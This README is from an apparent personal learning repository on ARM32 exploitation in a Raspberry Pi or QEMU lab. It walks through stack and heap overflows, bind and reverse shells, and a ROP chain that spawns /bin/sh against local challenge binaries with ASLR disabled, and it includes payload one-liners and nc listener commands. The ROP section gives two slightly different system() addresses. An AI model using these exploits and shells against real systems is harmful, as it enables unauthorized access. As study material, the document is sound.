# Raspberry Pi ARM Emulation & Exploitation

A personal knowledge base for learning ARM 32-bit exploitation — from setup to memory corruption and shellcode.

**Target platform:** ARMv6 (Raspberry Pi / QEMU)

**Architecture:** ARM32 (32-bit ARM)

# Disclaimer

**⚠️Disclaimer:** This repository is for **educational purposes only**. All techniques are intended for learning on systems you own or have explicit permission to test. Do not use this knowledge on systems you do not own. The author is not responsible for any misuse.


## Table of Contents

### Setup
1. [QEMU Setup](#qemu-setup)

### Memory Corruption
2. [Stack Overflow](#2-arm-32-bit-stack-overflow-exploit-raspberry-pi)
3. [Intra-chunk Heap Overflow](#3-intra-chunk-heap-overflow-lab)
4. [Inter-chunk Heap Overflow](#4-inter-chunk-heap-overflow)

### Exploitation
5. [Bind Shell](#5-bind-shell)
6. [Reverse Shell](#6-reverse-shell)
7. [ROP Exploit](#7-rop-exploit)

### Reference 
8. [References](#8-references)



# QEMU Setup

# 1. RASPBERRY PI ON QEMU

1. Download raspbian jessie image : https://downloads.raspberrypi.org/raspbian/images/raspbian-2017-04-10/
2. Unzip .zip file to get raspbian image
3. ​ Download latest qemu kernel: https://github.com/dhruvvyas90/qemu-rpi-kernel
4. Create new folder : $ mkdir ~/qemu_vms/
5. ​ Move raspbian image and qemu kernel to ~/qemu_vms/
6. ​ $ sudo apt-get install qemu-system
7. ​ fdisk -l 2017-04-10-raspbian-jessie.img

![alt text](/screenshots/fdisk.png)

8.​ Take the value of filesystem (.img2) 92160 and multiply by 512 = 47185920 bytes. I use
this value as an offset in following command

![alt text](/screenshots/multiply_disk.png)

9. ​ sudo nano /mnt/raspbian/etc/ld.so.preload
Comment out every entry in that file with ‘#

![alt text](/screenshots/comment.png)

10. $ cd ~
$ sudo umount /mnt/raspbian

11. ​Emulate it on Qemu by using the following commanded:

![alt text](/screenshots/​Emulate.png)

12. I get GUI of raspbian OS

![alt text](/screenshots/GUI.png)



# Memory Corruption

# 2. ARM 32-bit Stack Overflow Exploit (Raspberry Pi)

A hands-on demonstration of a classic stack buffer overflow vulnerability on ARM 32-bit Linux. This project shows how to redirect program execution by overwriting the saved return address on the stack.

## Overview

This exploit targets a simple C program with vulnerability: `gets()` reads unlimited input into a fixed-size buffer. By carefully crafting input, we overflow the buffer, overwrite the saved return address (`lr`) on the stack, and redirect execution to a different function (`hello()`).

## Building and Running

Raspberry Pi (or ARM 32-bit Linux) running Raspberry Pi OS

gcc, gdb, objdump, python3 installed

### Compile the Vulnerable Program

``` bash
gcc -o simple simple.c -fno-stack-protector
```

### Find the Address of hello()

``` bash
objdump -d simple | grep "<hello>:"
```
![alt text](/screenshots/adress.png)

### Find the Offset to the Return Address

Run the program under GDB with a distinguishable pattern:

![alt text](/screenshots/gdb.png)
![alt text](/screenshots/pc.png)

The value in pc tells you which group of bytes landed at the return address.
pc = 0x44444444, the DDDD group was at the return address position. Count bytes before it:

``` bash
AAAA BBBB CCCC = 12 bytes
```
So the offset is 12 bytes.

### Build the Payload

``` bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*12 + b'\x7c\x04\x01\x00')" > payload
``` 

Breakdown:

Component	            Value	            Meaning
b'A'*12	                AAAAAAAAAAAA	    Padding to reach the return address
b'\x7c\x04\x01\x00'	    0x0001047c	        Address of hello() in little-endian

### Run the Exploit

``` bash
./simple < payload
``` 
![alt text](/screenshots/op.png)

## Project Structure

``` bash
.
├── simple.c          # Vulnerable program
├── simple            # Compiled binary
├── payload           # Crafted exploit input
``` 

# 3. Intra Chunk Heap Overflow Lab
A beginner-friendly guide to understanding, compiling, debugging, and exploiting the intra-chunk heap overflow vulnerability.

## Overview
This lab demonstrates an intra-chunk heap overflow — a memory corruption bug where user input spills from one field of a struct into the next field of the same heap chunk.

The program creates a heap object with two fields:

name[8] — an 8-byte character buffer

number — a 4-byte integer set to 1234

It then uses the unsafe gets() function to read user input into name. Because gets() doesn't check length, typing 8 or more characters causes the null terminator (or more) to overwrite the number field.

Goal: Corrupt number so the program prints "Memory corrupted" instead of "Memory valid" — reaching a code path the programmer thought was impossible.

## The Vulnerable Code
File: C/buffer_overflow/Heap_overflow/intra_chunk.c

## Memory Layout

### Struct Layout (12 bytes total)
```bash
Offset  0    1    2    3    4    5    6    7    8    9   10   11
      ┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
      │         name[8]                       │       number        │
      └────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
      ↑                                        ↑
   objA->name                              objA->number
```

### Heap Chunk Layout
```bash
┌──────────────────┬─────────────────────────────────┐
│  Chunk Header    │        User Data (12 bytes)     │
│  (8 bytes)       │  ┌──────────────┬────────────┐  │
│  size + flags    │  │  name[8]     │  number    │  │
└──────────────────┴──┴──────────────┴────────────┴──┘
```

## Compile
``` bash
gcc intra_chunk.c -o intra_chunk -O
```

## Debugging Walkthrough
### Step 1: Start GDB
``` bash
gdb intra_chunk
```

### Step 2: Disassemble main
``` bash
disassemble main
```

![alt text](/screenshots/dissamble.png)

### Step 3: Set the Breakpoint
Break right after the bl gets instruction:
``` bash
break *0x00010498
``` 

![alt text](/screenshots/break.png)

#### Your address may differ! Always read your own disassembly. The rule is:
Find bl <gets@plt> → break at the very next instruction.

### Step 4: Run the Program
``` bash
run
``` 

### Step 5: Provide Input
Safe case — type 7 A's:
``` bash
AAAAAAA
```
![alt text](/screenshots/7a.png)

Attack case — type 8 A's (or more):
```bash
AAAAAAAA
```
![alt text](/screenshots/8a.png)

### Step 6: Find the Heap Address
```bash
vmmap
```

If vmmap doesn't work (common with PEDA or remote sessions), use:
```bash
info proc mappings
```

Look for the [heap] line:
![alt text](/screenshots/Heap_address.png)

### Step 7: Inspect the Heap
``` bash
x/20bx 0x21000
```
#### Safe case (7 A's):

![alt text](/screenshots/SAFE.png)

```bash
0x21000:  0x00 0x00 0x00 0x00  0x11 0x00 0x00 0x00   ← chunk header
0x21008:  0x41 0x41 0x41 0x41  0x41 0x41 0x41 0x00   ← name = "AAAAAAA\0"
0x21010:  0xd2 0x04 0x00 0x00                        ← number = 1234
```

### Attack case (8 A's):

![alt text](/screenshots/unsafe.png)

```bash
0x21000:  0x11 0x00 0x00 0x00  0x00 0x00 0x00 0x00   ← chunk header (unchanged)
0x21008:  0x41 0x41 0x41 0x41  0x41 0x41 0x41 0x41   ← name = "AAAAAAAA"
0x21010:  0x00 0x04 0x00 0x00                        ← number = 1024 
```

Notice: The 9th byte (null terminator from gets) overwrote the first byte of number, changing 0x000004d2 (1234) to 0x00000400 (1024).

### Step 8: Continue Execution
```bash
continue
```

#### Safe case output: Memory valid 
![alt text](/screenshots/memory_valid.png)


#### Attack case output: Memory corrupted
![alt text](/screenshots/memory_corrupted.png)

# 4. Inter-chunk Heap overflow
A beginner-friendly guide to understanding, compiling, debugging, and exploiting the intra-chunk heap overflow vulnerability.

## Overview
This lab demonstrates an inter-chunk heap overflow — a memory corruption bug where user input spills from one heap chunk across the boundary into the next chunk's header and data.

Unlike intra-chunk overflow (which corrupts a field within the same object), inter-chunk overflow corrupts heap metadata, making it far more dangerous.

Goal: Corrupt the second chunk's header and some_number field so the program prints "Memory corrupted" instead of "Memory valid" — reaching a code path the programmer thought was impossible.

## The Vulnerable Code
File: C/buffer_overflow/Heap_overflow/inter_chunk.c

## Memory Layout

### Two Separate Chunks
```bash
Heap memory:
┌─────────────────────────────────────────────────────────────────────┐
│  Chunk 1 (some_string)          │  Chunk 2 (some_number)            │
│  ┌──────────┬───────────────┐   │  ┌──────────┬───────────────┐     │
│  │ header   │ user data     │   │  │ header   │ user data     │     │
│  │ (8 bytes)│ (8 bytes)     │   │  │ (8 bytes)│ (4 bytes)     │     │
│  └──────────┴───────────────┘   │  └──────────┴───────────────┘     │
└─────────────────────────────────────────────────────────────────────┘
```

## Compile
```bash
gcc inter_chunk.c -o inter_chunk
```

## Debugging Walkthrough

### Step 1: Start GDB
```bash
gdb inter_chunk
```

### Step 2: Disassemble main
```bash
disassemble main
```
![alt text](/screenshots/disassemble_inter_chunk.png)

### Step 3: Set the Breakpoint
Break right after the bl gets@plt:

```bash
break *0x000104c4
```
![alt text](/screenshots/break_inter.png)
#### Your address may differ! Always read your own disassembly. The rule is:
Find bl <gets@plt> → break at the very next instruction.

### Step 4: Run the Program
```bash
run
```

### Step 5: Provide Input

Safe case — type 7 A's:
```bash
AAAAAAA
```
![alt text](/screenshots/7a_inter.png)


Attack case — type 16 A's (or more):
```bash
AAAAAAAAAAAAAAAA
```
![alt text](/screenshots/16a.png)

### Step 6: Find the Heap Address

```bash
info proc mappings
```
Look for [heap]:
![alt text](/screenshots/heap_address_inter.png)

### Step 7: Inspect the Heap

```bash
x/32bx 0x21000
```
Safe case (7 A's) —  output:
![alt text](/screenshots/expected_op.png)

```bash
0x21000:  0x00 0x00 0x00 0x00   0x11 0x00 0x00 0x00   ← chunk 1 header
0x21008:  0x41 0x41 0x41 0x41   0x41 0x41 0x41 0x00   ← "AAAAAAA\0"
0x21010:  0x00 0x00 0x00 0x00   0x11 0x00 0x00 0x00   ← chunk 2 header (intact)
0x21018:  0xd2 0x04 0x00 0x00   0x11 0x00 0x00 0x00   ← some_number = 1234
```

Attack case (16 A's) —  output:
![alt text](/screenshots/attack_op.png)

```bash
0x21000:  0x00 0x00 0x00 0x00   0x11 0x00 0x00 0x00   ← chunk 1 header (intact)
0x21008:  0x41 0x41 0x41 0x41   0x41 0x41 0x41 0x41   ← "AAAAAAAA"
0x21010:  0x41 0x41 0x41 0x41   0x41 0x41 0x41 0x41   ← chunk 2 header DESTROYED 
0x21018:  0x00 0x04 0x00 0x00   0x00 0x00 0x00 0x00   ← some_number = 1024
```

### Step 8: Continue Execution
```bash
continue
```
Safe case output: Memory valid
![alt text](/screenshots/mv.png)

Attack case output: Memory corrupted 
![alt text](/screenshots/mc.png)


# Exploitation

# 5. Bind Shell

## Build Instructions

### Step 1: Start the bind shell

In one terminal:

```bash
pi@raspberrypi:~/bindshell $ as bind_shell.s -o bind_shell.o && ld -N bind_shell.o -o bind_shell
pi@raspberrypi:~/bindshell $ ./bind_shel
```
![alt text](/screenshots/bind_shell_terminal1.png)

### Step 2: Connect from another terminal

In a second terminal:

```bash
pi@raspberrypi:~ $ netcat -vv 0.0.0.0 4444
```
![alt text](/screenshots/bind_shell_terminal2.png)

### Step 3: Interact with the shell
Once connected, you should see a shell prompt ($). Try:

```bash
id
uname -a
ls
```

# 6. Reverse Shell

## Build Instructions

### Step 1: Start the listener on the attacker machine

```bash
nc -lvp 4444
```
![alt text](/screenshots/listner.png)

### Step 2: Run the reverse shell on the Pi

```bash
pi@raspberrypi:~/reverseshell $ as reverse_shell.s -o reverse_shell.o && ld -N reverse_shell.o -o reverse_shell
pi@raspberrypi:~/reverseshell $ ./reverse_shell
```
![alt text](/screenshots/reverse.png)

### Step 3: Check the listener — it should print 


Connection from x.x.x.x port XXXXX [tcp/*] accepted

![alt text](/screenshots/Screenshot.png)

# 7. ROP Exploit

## Project Summary
Return-Oriented Programming (ROP) exploit against a vulnerable ARM32 binary (challenge1) on a Raspberry Pi. This exploit bypasses non-executable stack protections (XN) and spawns a shell by chaining existing code snippets ("gadgets") from the libc library.

**Target platform:** ARMv6 (Raspberry Pi / QEMU)

**Architecture:** ARM32 (32-bit ARM)

**Environment:** Raspberry Pi running Raspbian, ASLR disabled

**Result:** Shell obtained

## Objectives
Understand how stack buffer overflows work on ARM32

Bypass the XN (Execute Never) mitigation

Learn Return-Oriented Programming (ROP)

Build a working exploit that spawns /bin/sh

Document the entire process for future reference

## Environment Setup

### Prerequisites

```bash
Component	        Version/Details

Target machine	    Raspberry Pi (ARM32)
OS	                Raspbian (Debian-based)
Debugger	        GDB with PEDA
Target binary	    challenge1 (from Azeria Labs)
libc	            /lib/arm-linux-gnueabihf/libc-2.19.so
Host machine	    Linux (for remote debugging via SSH)
```

## Initial Setup Commands

```bash
# 1. Disable ASLR (Address Space Layout Randomization)
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"

# Verify ASLR is disabled
cat /proc/sys/kernel/randomize_va_space
# Expected output: 0
```
![alt text](/screenshots/01-aslr-disabled.png)

## Phase 1: Understanding the Vulnerability

### The Vulnerable Code
```bash
void func1(char *input) {
    char buffer[64];       // 64-byte buffer
    strcpy(buffer, input); // No bounds checking!
}
```
The strcpy() function copies user input into a 64-byte buffer without checking length. Input longer than 64 bytes overflows into the saved frame pointer and return address on the stack.

## Phase 2: Finding the Offset to the Return Address
Goal

Determine exactly how many bytes of input are needed to reach and overwrite the saved return address.

Where it came from: From the disassembly of func1:
![alt text](/screenshots/02-stack-dump.png)
```bash
sub r3, r11, #68    ← buffer starts at r11 - 68
```
Offset = 68 bytes

## Phase 3: Locating Useful Code (Gadgets)
Goal

Find gadgets and functions in libc that will let us call system("/bin/sh").

### Step 3.1: Find libc Base Address
```bash
info proc mappings
```
![alt text](/screenshots/03-libc-base.png)
Output showing libc loaded at 0xb6e74000

### Step 3.2: Find system() Function
```bash
p system
```
![alt text](/screenshots/04-system-address.png)

GDB reports system at 0xb6eadfac (__libc_system).

system() address = 0xb6eadfac

System_Offset = 0xb6eadfac - 0xb6e74000 = 0x39fac

### Step 3.3: Find the "/bin/sh" String
```bash
strings -a -t x /lib/arm-linux-gnueabihf/libc-2.19.so | grep "/bin/sh"
```
![alt text](/screenshots/05-bin-sh.png)
The string /bin/sh is found at offset 0x11db20 in libc.

/bin/sh offset = 0x11db20

### Step 3.4: Find a Gadget to Control r0

Since system() expects its argument in r0, we need a gadget that pops a value into r0 and then jumps to system().
```bash
# Disassemble libc
objdump -d /lib/arm-linux-gnueabihf/libc-2.19.so > /tmp/libc.asm

# Search for pop gadgets involving r0
grep -E "\bpop\b.*\br0\b" /tmp/libc.asm | head -30
```
![alt text](/screenshots/06-gadget-found.png)

### Step 3.5: Verify the Gadget in GDB

```bash
gdb /lib/arm-linux-gnueabihf/libc-2.19.so
x/6i 0xd4514
```
![alt text](/screenshots/07-gadget-verified.png)

GDB confirms: 0xd4514 <mcount+20>: pop {r0, r1, r2, r3, r11, pc}. This is exactly what we need.

## Phase 4: Building the ROP Chain

### Execution Plan
The ROP chain will execute in this order when the vulnerable function returns:

Jump to gadget: pop {r0, r1, r2, r3, r11, pc}

Gadget pops 6 values off the stack:
```bash
r0 = address of /bin/sh

r1 = junk

r2 = junk

r3 = junk

r11 = junk

pc = address of system()

CPU executes system("/bin/sh")

Shell spawned
```

### Payload Structure
```bash
┌──────────────────────────────────────────┐
│ [68 bytes of padding 'A']                │ ← Fills buffer to return address
├──────────────────────────────────────────┤
│ [Gadget address: 0xb6f48514]             │ ← Overwrites return address
├──────────────────────────────────────────┤
│ [/bin/sh address: 0xb6f91b20]            │ ← Popped into r0
├──────────────────────────────────────────┤
│ [Junk: 0x41414141]                       │ ← Popped into r1
├──────────────────────────────────────────┤
│ [Junk: 0x41414141]                       │ ← Popped into r2
├──────────────────────────────────────────┤
│ [Junk: 0x41414141]                       │ ← Popped into r3
├──────────────────────────────────────────┤
│ [Junk: 0x41414141]                       │ ← Popped into r11
├──────────────────────────────────────────┤
│ [system() address: 0xb6eaddac]           │ ← Popped into pc → system()
└──────────────────────────────────────────┘
```

### The Exploit Script

File: Exploit_Scripts/exploit.py

### Running the Exploit Script

```bash
python exploit.py
```
![alt text](/screenshots/08-script-output.png)

## Phase 5: Shell Obtained
```bash
./challenge1 "$(cat /tmp/final_payload.bin)"
```
![alt text](/screenshots/09-shell.png)

## How to Run
```bash
# 1. Disable ASLR
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"

# 2. Generate the payload
python exploit.py

# 3. Fire the exploit
./challenge1 "$(cat /tmp/final_payload.bin)"

# 4. You now have a shell!
```

## Key Learnings
### Technical Concepts
Stack buffer overflow — overwriting the return address to control program flow

XN mitigation — non-executable stack prevents shellcode execution

ROP (Return-Oriented Programming) — chaining existing code gadgets to bypass XN

Gadget — short instruction sequence ending in a return-like instruction

ARM calling convention — r0 holds the first argument for function calls

Little-endian byte order — how integers are stored in memory on ARM

ASLR — randomizes memory layout; must be disabled for this exploit

### Tooling Skills
GDB + PEDA — breakpoints, register inspection, memory dumps

objdump — disassembling binaries to find gadgets

strings + grep — finding strings in binaries

struct.pack — writing binary payloads in Python

# 8. References
Azeria Labs: Process Memory and Memory Corruption

Azeria Labs: ARM Assembly Basics

GEF (GDB Enhanced Features)

Azeria Labs: Return-Oriented Programming (ARM32)

Azeria Labs: Stack Overflows on ARM32

Azeria Labs: Writing ARM Shellcode